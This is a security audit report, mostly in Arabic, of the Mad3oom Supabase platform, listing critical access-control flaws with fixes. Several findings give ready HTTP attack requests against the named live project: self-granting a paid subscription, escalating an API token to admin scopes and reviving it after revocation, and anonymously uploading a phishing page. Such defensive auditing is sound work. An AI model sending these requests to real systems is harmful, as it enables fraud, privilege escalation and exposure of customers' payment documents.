# Full Project Audit

**المشروع:** Mad3oom (مدعوم) — منصة دعم فني / WhatsApp Business / MCP متعددة المستأجرين
**المستودع:** `moudabdelwahab/Mad3oom` — الفرع `claude/brave-clarke-or4axu`
**مشروع Supabase:** `srnelrdpqkcntbgudyto` (PostgreSQL 17.6، ap-south-1)
**تاريخ المراجعة:** 2026‑09‑17 / 18
**نوع المراجعة:** فحص وتحليل فقط — لم يُعدَّل أو يُحذف أي ملف أو كود أو بيانات. الاختبارات التي أُجريت على قاعدة البيانات كانت **قراءة فقط** أو ملفوفة داخل `BEGIN … ROLLBACK` صريح، فلم تُثبَّت أي كتابة.

---

## Summary Table

| ID | Severity | Category | Issue | Location | Status |
|----|----------|----------|-------|----------|--------|
| C-01 | Critical | Business Logic / Access Control | أي مستخدم عادي يمنح نفسه اشتراكًا `active` مدفوعًا مجانًا لعشر سنوات | `public.whatsapp_subscriptions` (RLS + trigger) · `migrations/023` غير مُطبَّق | **Confirmed (proven)** |
| C-02 | Critical | Privilege Escalation | المستخدم يكتب على أعمدة الاستحقاق في ملفه: `whatsapp_enabled`, `is_verified`, `ban_status`, `pi_uid`, `email` | `public.profiles` · `migrations/027` §2 غير مُطبَّق | **Confirmed (proven)** |
| C-03 | Critical | Privilege Escalation / IDOR | صاحب أي `api_token` يرفع صلاحياته إلى `admin:full` + `settings:manage` + `oauth:manage` بنداء PATCH واحد | `public.api_tokens` UPDATE policy | **Confirmed (proven)** |
| C-04 | Critical | Sensitive Data Exposure | كل مستودعات التخزين الخمسة `public=true` ولا سياسة SELECT واحدة → مرفقات التذاكر وإيصالات الدفع مقروءة للعالم بالرابط | `storage.buckets` · `migrations/028` و`030` غير مُطبَّقَين | **Confirmed** |
| C-05 | Critical | Broken Access Control | رفع ملفات **بلا مصادقة إطلاقًا** إلى مستودع `chat-attachments` العام، بلا حد حجم ولا حد نوع | `storage.objects` policy «Allow authenticated users to upload» | **Confirmed** |
| C-06 | Critical | Stored XSS → Admin Takeover | مجهول يحقن HTML في `site_errors.status`، ولوحة الإدارة تطبعه بلا هروب | `admin/errors.html:580` + `site_errors` INSERT policy | **Confirmed (proven)** |
| C-07 | Critical | IDOR / Cross‑tenant | `gemini-proxy` (منشورة v46) تقرأ اسم أي مستخدم وآخر 3 تذاكر له من `userId` في جسم الطلب | Edge Function `gemini-proxy` (غير موجودة في المستودع) | **Confirmed** |
| H-01 | High | Authentication | التحقق الثنائي (2FA/Telegram OTP) واجهة فقط: الجلسة تُصدَر كاملة قبل العامل الثاني | `auth-client.js:240-315` · `login.html:1440+` | **Confirmed** |
| H-02 | High | Authentication | `verify-otp` بلا مصادقة، وفحص عدد المحاولات يأتي **بعد** مطابقة الهاش → تخمين OTP بلا سقف | `supabase/functions/verify-otp/index.ts:36-58` | **Confirmed** |
| H-03 | High | Business Logic / Billing | إرسال WhatsApp عبر `send-whatsapp` و MCP بلا فحص رصيد وبلا خصم، وبتوكن المنصة لا توكن المستأجر | `send-whatsapp/_shared/whatsapp-service.ts:28-33` | **Confirmed** |
| H-04 | High | Broken Access Control | نظام الحظر غير مُنفَّذ في القاعدة إطلاقًا — `is_banned()` غير موجودة ولا تُستدعى | `migrations/029` §3 غير مُطبَّق | **Confirmed** |
| H-05 | High | Broken Access Control | انتحال هوية الكاتب في المنتدى والمجتمع: `author_id` / `user_id` غير مربوطة بـ`auth.uid()` | policies على `forum_threads`, `forum_replies`, `forum_reports`, `community_posts`, `community_comments` | **Confirmed** |
| H-06 | High | Webhook Security | `meta-webhook` يتخطّى التحقق من التوقيع بالكامل إذا كان `META_APP_SECRET` غير مضبوط (fail‑open) | `supabase/functions/meta-webhook/index.ts:32-45` | **Confirmed (code) / env غير متحقَّق منه** |
| H-07 | High | Cost Abuse / DoS | `huggingface-chatbot` وكيل LLM عام بلا مصادقة (`verify_jwt=false`) يحرق مفتاح المنصة | `supabase/functions/huggingface-chatbot/index.ts` | **Confirmed** |
| H-08 | High | Secrets Exposure | مفتاح Cloudflare Turnstile السري مكتوب في ملف يُخدَم للمتصفح | `turnstile-config.js:16` | **Confirmed** |
| H-09 | High | Architecture / Process | انحراف ضخم بين المستودع والإنتاج: 6 ترحيلات أمنية غير مُطبَّقة، و~19 دالة منشورة بلا مصدر في المستودع | عام | **Confirmed** |
| H-10 | High | Authorization Design | بقايا «البريد كسلطة» في سياسات ودوال حسّاسة رغم أن 040 أزالها من الدوال المركزية | `central_wallet*`, `integrations`, `mcp_servers`, `bot_api_keys`, `is_sie_admin()`, `manage_user_points()`, `transfer_points_from_central()`, `mcp/_shared/actor.ts:3` | **Confirmed** |
| M-01 | Medium | Rate Limiting | حد معدل مفاتيح API قابل للتجاوز: العدّ يُكتب بعد الرد وبلا انتظار، ويفشل مفتوحًا | `mcp/_shared/api-auth.ts:74-88` | **Confirmed** |
| M-02 | Medium | Business Logic | تحديث `integrations.metadata` مباشرة يتجاوز بوابة `wa_set_integration_billing_method` | `integrations` UPDATE policy | **Confirmed** |
| M-03 | Medium | Information Leakage | `check-subdomain-status` يعيد `user_id` المالك لأي مجهول | `check-subdomain-status/index.ts:70-77` | **Confirmed** |
| M-04 | Medium | Information Leakage | كشف البريد من اسم المستخدم/الهاتف/بيانات الشركة (مع حد معدل) | `get_email_by_username`, `get_email_by_phone`, `resolve_company_member_login` | **Confirmed** |
| M-05 | Medium | Rate Limiting | `sie_rate_limit_hit(p_client_ip)` يقبل IP من المنادي → تجاوز الحد أو تسميم دلو غيرك | RPC (قابل للتنفيذ من `anon`) | **Confirmed** |
| M-06 | Medium | Sensitive Data Exposure | سرّ TOTP (`profiles.two_factor_secret`) مقروء في المتصفح ويُرسل في جسم الطلب | `login.html:1447` · `customer-settings-modal.js` | **Confirmed** |
| M-07 | Medium | Race Condition | `transfer_points_from_central` يفحص الرصيد على قراءة قديمة بلا `FOR UPDATE` | RPC | **Confirmed** |
| M-08 | Medium | Authorization | `assertScope` في `integrations-api` يمرّ عندما تكون قائمة النطاقات فارغة | `integrations-api/core/auth.ts` (منشورة) | **Confirmed** |
| M-09 | Medium | Dependencies / Supply Chain | صفر `integrity=` على كل سكربتات CDN، ونسخ غير مثبّتة (`supabase-js@2`, `chart.js`), واستيراد كود من أصل آخر | كل ملفات HTML · `assets/js/admin/whatsapp-wallet-topup-service.js` | **Confirmed** |
| M-10 | Medium | Dependencies | `xlsx@0.18.5` بها ثغرة تلوث prototype معروفة؛ `dompurify@3.1.6`, `jspdf@2.5.1`, `deno std@0.177.0` قديمة | `package.json`, `package-lock.json`, HTML | **Confirmed (xlsx) / Potential (البقية)** |
| M-11 | Medium | Input Validation | `whatsapp_wallet_topup_requests` INSERT لا يقيّد `status` | RLS policy | **Confirmed** |
| M-12 | Medium | Reliability / Billing | فشل خصم المحفظة يُسجَّل ويُبتلع بعد إرسال الرسالة → إيراد ضائع | `integrations-api/runtime/whatsapp-dispatcher.ts` | **Confirmed** |
| M-13 | Medium | Performance | 180 سياسة تعيد تقييم `auth.uid()` لكل صف، و261 تداخل «سياسات متعددة مسموحة» | Supabase performance advisor | **Confirmed** |
| M-14 | Medium | Performance | 108 مفتاح أجنبي بلا فهرس يغطيه | Supabase performance advisor | **Confirmed** |
| M-15 | Medium | Code Quality | نسختان من `api-auth.ts` انحرفتا عن بعضهما فعلًا | `mcp/_shared/` vs `send-whatsapp/_shared/` | **Confirmed** |
| M-16 | Medium | Scalability | `pi-auth` يمرّ على `listUsers` صفحة بصفحة في كل دخول، وينكسر بعد 10,000 مستخدم | `pi-auth/index.ts:56-68` | **Confirmed** |
| M-17 | Medium | Abuse | إدراج مجهول غير محدود في `site_errors` (1,429 صفًّا حاليًا) | `site_errors` INSERT policy | **Confirmed** |
| M-18 | Medium | Attack Surface | دوال ميتة/مؤقتة ما زالت منشورة (`ai-probe-temp`, `gemini-proxy`, ازدواج webhook البريد) | Supabase Edge Functions | **Confirmed** |
| M-19 | Medium | Business Logic | الأدمن/الدعم يرسل HTML عشوائيًا من عنوان موثَّق للمنصة | `send-ticket-email/index.ts` | **Confirmed** |
| L-01 | Low | CORS | `Access-Control-Allow-Origin: *` في كل الدوال | جميع Edge Functions | Informational |
| L-02 | Low | Cryptography | مقارنات أسرار غير ثابتة الزمن | `meta-webhook`, `send-ticket-email`, `ai-gateway` | **Confirmed** |
| L-03 | Low | Information Leakage | إعادة نص خطأ المزوّد الخارجي للعميل | `get-attachment-url/index.ts:83` | **Confirmed** |
| L-04 | Low | Database | 19 جدولًا عليه RLS بلا أي سياسة (مغلق فعليًا، لكن النية غير موثّقة) | `public.*` | Informational |
| L-05 | Low | Authentication | حماية «كلمات المرور المسرَّبة» معطّلة في Supabase Auth | إعدادات المشروع | **Confirmed** |
| L-06 | Low | Database Hygiene | 9 دوال بـ`search_path` قابل للتغيير، و3 امتدادات في `public` (`pg_net`, `http`, `btree_gist`) | `public.*` | **Confirmed** |
| L-07 | Low | Frontend | جلسة الزائر في `localStorage` قابلة للتزوير (عرض فقط) | `auth-client.js:26-48` | **Confirmed (أثره محدود)** |
| L-08 | Low | Performance | 85 فهرسًا غير مستخدم و3 فهارس مكرّرة | Supabase advisor | **Confirmed** |
| L-09 | Low | Information Leakage | `console.log/error` لبيانات ملف المستخدم وأخطاء المصادقة في الإنتاج | `auth-client.js`, `login.html` | **Confirmed** |
| L-10 | Low | Architecture | ارتباط صلب بنطاق `mad3oom.online` في OAuth issuer وسياسات ودوال | `oauth-discovery`, `central_wallet*`, `send-ticket-email` | **Confirmed** |
| L-11 | Low | Code Quality | ازدواج شجرة MCP كاملة (`mcp/mcp.js` 103KB مقابل `assets/js/admin/mcp.js`) وثلاث نسخ من `mcp-arch` | `mcp/`, `assets/js/admin/`, `supabase/functions/*/_shared/mcp-arch` | **Confirmed** |
| L-12 | Info | Code Quality | 42 ملف HTML في الجذر بلا خطوة بناء، وملفات `_rollback` وتقارير سابقة داخل المستودع | جذر المشروع | Improvement |
| L-13 | Info | Compliance | `data-deletion.html` صفحة شبه فارغة (715 بايت) رغم كونها مطلبًا لمراجعة Meta | `data-deletion.html` | Improvement |

**الإجمالي:** 7 Critical · 10 High · 19 Medium · 13 Low/Informational.

---

## Executive Summary

مشروع Mad3oom مبنيّ بمعمارية «الحماية في قاعدة البيانات»: واجهات ثابتة بلا خطوة بناء، Supabase (Postgres + RLS + دوال SECURITY DEFINER) كطبقة التفويض الحقيقية، و42 دالة حافة (Edge Functions) كواجهة برمجية. وسلسلة الترحيلات `migrations/001..042` تُظهر عملًا أمنيًا **ممتاز المستوى فكريًّا**: فصل نطاقات السلطة، نزع البريد كآلية تفويض، سياق مالك المنصة، بوابات استحقاق ذرّية في القاعدة، وحزمة اختبارات RLS حقيقية في CI.

**لكن المشكلة الأكبر في هذا المشروع ليست في تصميمه، بل في أن جزءًا من هذا التصميم غير منشور.**

عند مقارنة المستودع بقاعدة البيانات الحيّة تبيّن أن **ستة ترحيلات أمنية مكتوبة ومختبَرة لم تُطبَّق على الإنتاج إطلاقًا** (023، 027 §2، 028، 029 §3، 030، و012 جزئيًا). وكل واحد منها كان مكتوبًا تحديدًا لإغلاق ثغرة موصوفة ومُثبَتة داخل ملف الترحيل نفسه. النتيجة أن **الثغرات التي يوثّق المستودع إغلاقها ما زالت مفتوحة في الإنتاج اليوم**:

- أي مستخدم مسجَّل يقدر بنداء REST واحد أن يمنح نفسه باقة `bundle` فعّالة حتى 2036 — **أُثبت عمليًا داخل معاملة رُجِع عنها**.
- أي مستخدم يقدر يضبط `whatsapp_enabled = true` و`is_verified = true` و`ban_status = null` على صفّه — **أُثبت عمليًا**.
- كل مرفقات التذاكر (وفيها إيصالات دفع) مقروءة لأي شخص على الإنترنت بالرابط، ومستودع `chat-attachments` يقبل رفعًا **بلا مصادقة على الإطلاق**.

ويُضاف إلى ذلك انحراف من الاتجاه المعاكس: **19 دالة حافة منشورة على الإنتاج بلا أي مصدر في المستودع**، منها `gemini-proxy` التي شخّصها تقرير سابق داخل المستودع نفسه كـ«قراءة عابرة للمستأجرين مُثبَتة» وحُذفت من المستودع — **وما زالت منشورة ونشطة (v46) وقابلة للاستغلال اليوم**.

خارج مسألة الانحراف، ثلاث ثغرات أخرى قائمة في كود المستودع نفسه: تصعيد صلاحيات مفاتيح API إلى `admin:full` عبر PATCH مباشر، وXSS مخزَّن في لوحة الإدارة يحقنه **مجهول**، ومسار إرسال WhatsApp بلا أي فحص رصيد أو خصم.

**الخلاصة الموضوعية:** الأساس الأمني للمشروع جيد جدًا وفوق المتوسط بكثير لمشروع بهذا الحجم؛ لكنه **ليس جاهزًا للإنتاج في حالته الحالية**، والسبب الأول ليس نقص التصميم بل غياب انضباط النشر وإثبات التطابق بين المستودع والبيئة الحيّة.

---

## Overall Findings

### أرقام المراجعة

| البند | العدد |
|---|---|
| ملفات فُحصت في المستودع | 550 (200 JS · 86 HTML · 84 TS · 64 SQL · 36 MD · 33 MJS) |
| أسطر SQL في `migrations/` | 10,523 |
| أسطر TypeScript في دوال الحافة | 7,623 |
| أسطر JavaScript | 61,359 |
| جداول في `public` | 160 — كلها عليها RLS مُفعَّل |
| سياسات RLS | ~470 |
| دوال حافة في المستودع | 42 |
| دوال حافة منشورة فعلًا | 60 (**19 منها بلا مصدر في المستودع**) |
| ترحيلات في المستودع | 41 ملفًا (001–042، لا يوجد 026) |
| ترحيلات أمنية غير مُطبَّقة على الإنتاج | **6** |

### حالة تطبيق الترحيلات (تحقُّق مباشر من الإنتاج)

| الترحيل | كائن مرجعي | مطبَّق؟ |
|---|---|---|
| 001–011, 013–022 | متعدد | ✅ |
| **012** `reopen_ticket_on_owner_reply` | دالة | ❌ (يبدو أن 034 حلّ محلّه جزئيًا) |
| **023** `request_subscription_purchase` | دالة | ❌ **← C-01** |
| 024 `is_platform_staff` | دالة | ✅ |
| 025 | سياسات | ✅ |
| **027 §2** `guard_profile_protected_columns` | محفّز | ❌ **← C-02** |
| 027 (بقيته) `owned_feature_keys`, `is_landing_admin`, `wf_is_staff` | دوال | ✅ |
| **028** `can_access_ticket` | دالة | ❌ **← C-04** |
| **029 §3** `is_banned` | دالة | ❌ **← H-04** |
| 029 §1–2 `has_chatbot_entitlement`, حارس النقاط | دوال | ✅ (بصيغة مختلفة قليلًا) |
| **030** `storage_ticket_id` + `ticket_attachments.file_path` | دالة/عمود | ❌ **← C-04** |
| 031–042 | متعدد | ✅ |

> **ملاحظة منهجية مهمة:** حزمة `tests/sql/` في CI تطبّق ترحيلات **المستودع** على Postgres مؤقت وتفحصها هناك. فـ«CI أخضر» يثبت أن الترحيل **صحيح**، ولا يثبت إطلاقًا أنه **منشور**. هذه بالضبط الفجوة التي سمحت لكل ما سبق بالمرور.

---

## Critical Issues

### C-01 — منح النفس اشتراكًا مدفوعًا فعّالًا مجانًا

| | |
|---|---|
| **Severity** | Critical |
| **Category** | Business Logic · Broken Access Control · Subscription Bypass |
| **Location** | `public.whatsapp_subscriptions` — سياسة `Users can create their own subscriptions` + محفّز `trg_enforce_subscription_purchase_rules` |
| **Related** | `migrations/023_subscription_purchase_rpc.sql` (مكتوب، **غير مُطبَّق**) · `migrations/017_subscription_business_rules.sql:198` · `subscriptions-script.js` · `whatsapp-subscription-service.js` |
| **Layer** | Database (RLS + Trigger) |
| **Exploitability** | عالية جدًا — طلب HTTP واحد بمفتاح `anon` العام وجلسة مستخدم عادية |

**Description**
سياسة الإدراج القائمة على الإنتاج هي:

```sql
WITH CHECK ( auth.uid() = user_id
             AND (ticket_id IS NULL OR EXISTS (… tickets.user_id = auth.uid())) )
```

لا قيد على `status`، ولا على `start_date`، ولا على `end_date`. وعمود `status` افتراضه `'active'` أصلًا.

خط الدفاع الثاني — المحفّز `enforce_subscription_purchase_rules()` — المنشور على الإنتاج هو **نسخة 017**، لا نسخة 023:

```sql
if new.status is distinct from 'pending' and new.status is distinct from 'active' then return new; end if;
if auth.uid() is null or public.is_admin() then return new; end if;
v_check := public.subscription_purchase_check(new.plan, new.is_renewal, new.user_id);
```

أي أنه **يسمح صراحةً بـ`status = 'active'`**، ويكتفي بسؤال `subscription_purchase_check` سؤالًا واحدًا: «هل تضيف هذه الباقة خدمات جديدة؟» — ومن لا يملك شيئًا تضيف له كل باقة كل شيء، فيعود `allowed: true, code: 'adds_features'`.

ودالة `request_subscription_purchase()` التي كان من المفترض أن تكون المسار الوحيد **غير موجودة على الإنتاج** (`to_regprocedure` ترجع NULL).

**Why it is a problem**
كل نموذج الإيرادات يقوم على `whatsapp_subscriptions`. ودوال الاستحقاق `owned_feature_keys()` و`company_has_feature()` و`has_feature_access()` كلها تقرأ الاشتراكات الفعّالة. فصف واحد مزوَّر يفتح كل الميزات المدفوعة دفعة واحدة.

**Attack Scenario**
```http
POST /rest/v1/whatsapp_subscriptions
apikey: <anon key المنشور في supabase-config.js>
Authorization: Bearer <access_token لأي حساب عادي>
Content-Type: application/json

{"user_id":"<my-uuid>","plan":"bundle","status":"active",
 "billing_cycle":"yearly","start_date":"2026-09-17T00:00:00Z",
 "end_date":"2036-09-17T00:00:00Z"}
```

**Evidence (مُثبَت، ورُجِع عنه)**
نُفِّذ داخل `BEGIN … ROLLBACK` بهوية حساب حقيقي `role='user'`:

```
test: SUBSCRIPTION_SELF_GRANT | plan: bundle | status: active | end_date: 2036-09-17
```

**Potential Impact**
خسارة كاملة للإيراد؛ فتح كل الميزات المدفوعة (WhatsApp، المستخدمون الفرعيون، مفاتيح API، MCP) لأي حساب مجاني؛ إفساد بيانات المحاسبة لأن `accounting-sync` يفوتر كل اشتراك `active`.

**Recommended Fix**
1. طبّق `migrations/023` كما هو مكتوب — فهو يعالج المشكلة بدقة (حذف سياسة الإدراج + تشديد المحفّز + دالة `request_subscription_purchase` التي لا تأخذ `user_id` ولا `status` ولا تواريخ كمعاملات).
2. بعد التطبيق، تحقّق: `select to_regprocedure('public.request_subscription_purchase(text,text,uuid,boolean,text,text)')` غير NULL، و`select count(*) from pg_policies where tablename='whatsapp_subscriptions' and cmd='INSERT' and policyname like 'Users%'` تساوي صفرًا.
3. راجع الصفوف القائمة: `select * from whatsapp_subscriptions where status='active' and reviewed_by is null` بحثًا عن استغلال سابق.

**Priority** — P0، قبل أي شيء آخر.
**Requires** — Database فقط (الترحيل جاهز). الواجهة تحتاج تحويل نداء الشراء إلى الـRPC الجديد.

---

### C-02 — كتابة أعمدة الاستحقاق وحالة الحساب على الملف الشخصي

| | |
|---|---|
| **Severity** | Critical |
| **Category** | Privilege Escalation · Subscription Bypass · Broken Access Control |
| **Location** | `public.profiles` — سياسة `profiles_update_policy` (`migrations/040:491`) بلا محفّز حماية أعمدة |
| **Related** | `migrations/027_legacy_security_closure.sql:218-270` (مكتوب، **غير مُطبَّق**) · `has_chatbot_entitlement()` · `pi-auth` |
| **Layer** | Database |
| **Exploitability** | عالية جدًا |

**Description**
`profiles_update_policy` تسمح بـ`auth.uid() = id`، والمنح على مستوى الجدول يشمل `UPDATE` على **كل الأعمدة** لدور `authenticated`. والمحفّزات الموجودة فعلًا على `profiles` هي:

```
enforce_2fa_change_requires_challenge · guard_profile_phone_format
guard_profile_points_change · guard_profile_role_change
guard_profile_super_user_id_insert · profiles_guard_aqar_enabled
tr_check_super_user_creation · trg_preview_read_only · trg_sync_company_role
```

**`guard_profile_protected_columns` ليست منها.** أي أن الأعمدة التي يقفلها الترحيل 027 مفتوحة كلها:

| العمود | الأثر عند الكتابة |
|---|---|
| `whatsapp_enabled` | `has_chatbot_entitlement()` تصير `true` → ميزة مدفوعة بلا دفع |
| `is_verified` | شارة توثيق مزوّرة |
| `ban_status` / `ban_until` / `is_locked` / `failed_login_attempts` | فكّ حظر النفس وتصفير عدّاد الدخول |
| `pi_uid` | حجز هوية Pi Network لشخص آخر (العمود UNIQUE) |
| `email` | محاولة انتحال حساب إداري |

**Evidence (مُثبَت، ورُجِع عنه)**
```
test: PROFILE_SELF_WRITE | whatsapp_enabled: true | is_verified: true
                         | ban_status: null | entitlement(has_chatbot_entitlement): true
```

**False‑positive تمّ استبعاده:** انتحال الحساب الإداري عبر `email` **محجوب اليوم** بقيد `profiles_email_unique` لأن العنوانين `support@mad3oom.online` و`info@mad3oom.online` موجودان فعلًا في الجدول. وهذا — كما يقول الترحيل 027 حرفيًا — «**حظّ لا حاجز**»: لو حُذف أحد الصفّين أو تغيّر عنوانه، صارت السياسات التي تقرأ `profiles.email` (انظر H-10) قابلة للاختطاف فورًا.

**Potential Impact**
تجاوز اشتراك مباشر؛ إبطال أي عمل مستقبلي على الحظر؛ تعطيل ربط Pi لمستخدم آخر؛ ومسار تصعيد كامن إلى صلاحيات إدارية.

**Recommended Fix**
طبّق `migrations/027` §2 (المحفّزان `guard_profile_protected_columns` و`guard_profile_protected_columns_insert`). وكإجراء تعميق إضافي: اسحب `UPDATE` على مستوى الأعمدة من `authenticated` واقصره على الأعمدة التي يحق للمستخدم تعديلها فعلًا (`full_name`, `username`, `avatar_url`, `phone`, `bio`, …).

**Priority** — P0.
**Requires** — Database فقط.

---

### C-03 — تصعيد صلاحيات مفاتيح API إلى صلاحيات مشغّل المنصة

| | |
|---|---|
| **Severity** | Critical |
| **Category** | Privilege Escalation · Broken Access Control |
| **Location** | `public.api_tokens` — سياسة `Users can toggle active state of their own tokens` (UPDATE, `USING auth.uid() = user_id`, بلا `WITH CHECK` وبلا قيد أعمدة) |
| **Related** | `migrations/036_api_token_authorization.sql` · `supabase/functions/create-api-token/index.ts:145-160` · `supabase/functions/mcp/_shared/api-auth.ts` |
| **Layer** | Database |
| **Exploitability** | متوسطة‑عالية — مشروطة بامتلاك الحساب مفتاح API واحدًا على الأقل |

**Description**
الترحيل 036 بنى سقف صلاحيات على الخادم (`api_token_scope_ceiling()`) يمنع حساب الشركة من بلوغ `admin:full` / `settings:manage` / `oauth:manage`، ودالة `create-api-token` تفرضه بدقة عند **الإصدار**.

لكن السقف لا يُفرَض بعد الإصدار إطلاقًا: RLS لا تقيّد الأعمدة، والمنح على مستوى الجدول يشمل `UPDATE` على كل عمود بما فيه `scopes` و`expires_at` و`revoked_at` و`is_active`، ولا يوجد محفّز `BEFORE UPDATE` على مستوى الصف يحرس `scopes` (الموجود هو `trg_preview_read_only` وهو محفّز **جملة** لوضع المعاينة فقط).

اسم السياسة يقول «toggle active state»، لكن **RLS لا تستطيع تقييد الأعمدة** — الاسم وصف نيّة لا قيد.

**Attack Scenario**
```http
PATCH /rest/v1/api_tokens?id=eq.<my-token-id>
Authorization: Bearer <access_token>

{"scopes":["admin:full","settings:manage","oauth:manage",
           "tickets:delete","customers:write","subscriptions:write"],
 "is_active":true,"revoked_at":null,"expires_at":null}
```
ثم يُستخدَم المفتاح على `/functions/v1/mcp` و`/functions/v1/send-whatsapp` بالصلاحيات الجديدة. ولاحظ أن نفس النداء **يُلغي الإبطال** (`revoked_at = null`) ويزيل تاريخ الانتهاء — أي أن إبطال مفتاح مسرَّب من لوحة الإدارة قابل للتراجع من قِبَل صاحبه.

**Evidence (مُثبَت، ورُجِع عنه)**
```
test: API_TOKEN_SCOPE_ESCALATION
scopes: ["admin:full","settings:manage","oauth:manage"]
is_active: true | revoked_at: null | expires_at: null
```

**Exploitability — تحديد دقيق**
حاليًا صفوف `api_tokens` الـ23 كلها مملوكة لحسابَي `admin` و`platform_owner` فقط، فلا يوجد اليوم مستأجر غير مميّز يملك مفتاحًا. لكن `can_create_api_token()` تسمح صراحةً لمدير شركة باستحقاق `api_tokens` بإصدار مفتاح — وفي اللحظة التي يصدر فيها أول مفتاح شركة، يصير هذا المسار **مستغَلًّا فعليًا**. وبالجمع مع C-01 (منح النفس باقة `bundle`) يصير المسار متاحًا لأي مستخدم مجاني في خطوتين.

**Potential Impact**
تجاوز كامل لسقف الصلاحيات المصمَّم في 036؛ الوصول إلى أدوات MCP الإدارية؛ إرسال WhatsApp بلا استحقاق (انظر H-03)؛ وإحياء مفاتيح مبطَلة.

**Recommended Fix**
1. محفّز `BEFORE UPDATE … FOR EACH ROW` على `api_tokens` يرفض أي تغيير في `scopes`, `user_id`, `api_key`, `secret_hash`, `bearer_token_hash`, `credential_type` من منادٍ له `auth.uid()`، ويسمح بتغيير `revoked_at`/`is_active` في اتجاه الإبطال فقط.
2. أو الأنظف: اسحب `UPDATE` عن الجدول من `authenticated` بالكامل، واجعل التفعيل/الإبطال يمرّ بدالة `SECURITY DEFINER` (`revoke_my_api_token(uuid)`).
3. راجع `select id, user_id, scopes from api_tokens where scopes::text like '%admin:full%'` للتأكد من عدم وجود استغلال سابق.

**Priority** — P0.
**Requires** — Database.

---

### C-04 — كل مستودعات التخزين عامة، ولا سياسة قراءة واحدة

| | |
|---|---|
| **Severity** | Critical |
| **Category** | Sensitive Data Exposure · Multi‑tenant Isolation |
| **Location** | `storage.buckets` · `storage.objects` |
| **Related** | `migrations/028_storage_closure.sql` و`migrations/030_storage_privatisation.sql` (مكتوبان، **غير مُطبَّقَين**) · `supabase/functions/get-attachment-url/index.ts` · `storage-urls.js` |
| **Layer** | Storage / Database |
| **Exploitability** | عالية — لا تحتاج حسابًا |

**Description**
الحالة الحيّة:

| المستودع | `public` | حد الحجم | أنواع مسموحة |
|---|---|---|---|
| `avatars` | ✅ true | بلا حد | بلا قيد |
| `chat-attachments` | ✅ true | بلا حد | بلا قيد |
| `platform-assets` | ✅ true | بلا حد | بلا قيد |
| `subdomain-logos` | ✅ true | 2 MB | صور فقط |
| `tickets` | ✅ true | بلا حد | بلا قيد |

وعدد سياسات `SELECT` على `storage.objects` = **صفر**.

المستودع العام يعني أن `/storage/v1/object/public/tickets/<path>` يُخدَم **بلا أي مصادقة** ولا يمرّ بـRLS إطلاقًا. والترحيل 028 يوصّف المشكلة بنفسه: «مستودع `tickets` يحوي إيصالات دفع العملاء، و`ticket_attachments.file_url` يخزّن الرابط العام **المطلق** لكل مرفق. أي رابط يُرى مرة يبقى صالحًا للأبد ويُمرَّر لأي أحد».

وعمود `ticket_attachments.file_path` الذي يضيفه 030 **غير موجود**، ودالة `can_access_ticket(uuid)` **غير موجودة** — أي أن الترحيلين لم يُطبَّق منهما شيء.

**النتيجة الجانبية:** دالة `get-attachment-url` (المحكمة والمقصورة على الأدمن) بلا معنى عمليًّا ما دام المستودع نفسه عامًا.

**Attack Scenario**
مسارات الكائنات في Supabase Storage مشتقة عادةً من أسماء الملفات ومعرّفات التذاكر، ومنها ما يُسرَّب في Referer أو في مشاركة رابط واحدة. ومن حصل على أي رابط، احتفظ به للأبد ومرّره — لا انتهاء ولا إبطال.

**Potential Impact**
تسريب مستندات العملاء وإيصالات الدفع عبر المستأجرين وخارج المنصة بالكامل. أثر تنظيمي وخصوصي مباشر.

**Recommended Fix**
طبّق 028 ثم 030 **بالترتيب الموصوف داخلهما بالحرف** (سياسات القراءة أولًا → عمود `file_path` → نشر كود الواجهة الذي يوقّع الروابط → ثم قلب `public=false`). قلب المستودع أولًا سيكسر كل المرفقات القائمة فورًا.

**Priority** — P0/P1 (P0 للبيانات، لكن التنفيذ متعدد الخطوات ولا يجوز تسريعه).
**Requires** — Database + Storage + Frontend (توقيع الروابط).

---

### C-05 — رفع ملفات بلا أي مصادقة إلى مستودع عام

| | |
|---|---|
| **Severity** | Critical |
| **Category** | Broken Access Control · Abuse · Cost |
| **Location** | `storage.objects` — سياسة `Allow authenticated users to upload` |
| **Layer** | Storage |
| **Exploitability** | عالية — لا تحتاج حسابًا |

**Description**
رغم اسمها، السياسة هي:

```sql
CREATE POLICY "Allow authenticated users to upload" ON storage.objects
  FOR INSERT TO public
  WITH CHECK (bucket_id = 'chat-attachments');
```

لا `auth.uid() IS NOT NULL`، ولا `auth.role() = 'authenticated'`، ولا نطاق مسار. والدور `public` يشمل `anon`. والمستودع بلا `file_size_limit` وبلا `allowed_mime_types`، وهو `public = true`.

**Attack Scenario**
```http
POST /storage/v1/object/chat-attachments/anything.html
apikey: <anon key>
Content-Type: text/html

<html>… صفحة تصيّد تحمل هوية المنصة …</html>
```
ثم تُقرأ من `/storage/v1/object/public/chat-attachments/anything.html`.

**Potential Impact**
- استضافة ملفات مجانية / توزيع برمجيات خبيثة من بنية المنصة.
- تصيّد على نطاق `*.supabase.co` المرتبط بالمشروع.
- استنزاف تخزين وحزمة نقل بلا سقف (تكلفة + DoS).

**ملاحظة نطاق دقيقة:** الملفات تُخدَم من أصل `supabase.co` لا من أصل التطبيق، فـXSS على جلسة المنصة **ليس** أثرًا مباشرًا هنا. الخطر هو الاستضافة والتصيّد والتكلفة.

**Recommended Fix**
```sql
-- شكل مقترح، لا يُطبَّق ضمن هذا التقرير
alter policy "Allow authenticated users to upload" on storage.objects
  with check (bucket_id = 'chat-attachments'
              and auth.uid() is not null
              and (storage.foldername(name))[1] = auth.uid()::text);
```
مع ضبط `file_size_limit` و`allowed_mime_types` على كل المستودعات الأربعة التي بلا حدود.

**Priority** — P0.
**Requires** — Storage policies.

---

### C-06 — XSS مخزَّن في لوحة الإدارة يحقنه مجهول

| | |
|---|---|
| **Severity** | Critical |
| **Category** | XSS · Admin Account Takeover |
| **Location** | `admin/errors.html:580` — `<div class="error-card ${err.status} …">` + سياسة `Allow public insert for errors` على `public.site_errors` |
| **Related** | `error-tracker.js` · `error-service.js:11-30` |
| **Layer** | Frontend + Database |
| **Exploitability** | عالية — تحتاج فقط أن يفتح الأدمن تبويب «الكل» أو «تم الحل» أو «الأرشيف» |

**Description**
سياسة الإدراج على `site_errors` مفتوحة للدور `public` (أي `anon`) وتقيّد ثلاثة حقول فقط:

```sql
WITH CHECK ( char_length(message) <= 2000
             AND (stack_trace IS NULL OR char_length(stack_trace) <= 8000)
             AND (type IS NULL OR type = ANY (ARRAY['js','network','promise','resource','console','unhandled'])) )
```

